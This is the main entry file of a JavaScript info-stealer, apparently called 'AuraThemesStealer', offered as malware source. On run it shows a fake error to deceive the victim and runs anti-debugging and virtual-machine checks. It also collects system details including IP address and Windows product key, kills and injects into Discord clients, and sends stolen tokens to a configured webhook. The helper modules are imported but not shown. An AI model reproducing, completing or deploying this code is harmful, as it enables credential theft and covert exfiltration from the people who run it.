
import("dotenv").then(dotenv => dotenv.config());
import("./utils/console/error.mjs").then(error => error.error());

import { get_info } from "./modules/core/core.mjs";
import { discord_injected, kill_discords } from "./modules/injections/discord.mjs";
import { fake_error } from "./modules/fake_error/fake.mjs";
import { send_webhook_tokens } from "./modules/tokens/send.mjs";
import { antidebug } from "./modules/antidebug/antidebug.mjs";

import config from "./config/config.mjs";

const {
    WEBHOOK,
    ERROR_MESSAGE,
    KILL_DISCORDS,
    VM_DEBUGGER,
    DC_INJECTION,
} = config;

class AuraThemesStealer {
    constructor() {
        this.aurita();
    }
    async aurita() {
        try {
            const { 
                DISK, 
                RAM, 
                UID, 
                CPU_COUNT, 
                IP, 
                OS, 
                CPU, 
                GPU, 
                WINDOWS_KEY, 
                WINDOWS_VERSION 
            } = await get_info();

            await fake_error(ERROR_MESSAGE, config)
            await antidebug(VM_DEBUGGER, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
            await kill_discords(KILL_DISCORDS);
            await discord_injected(DC_INJECTION);
            await send_webhook_tokens(WEBHOOK);
    
        } catch (err) {
            console.log(err)
        }
    }
}

new AuraThemesStealer();

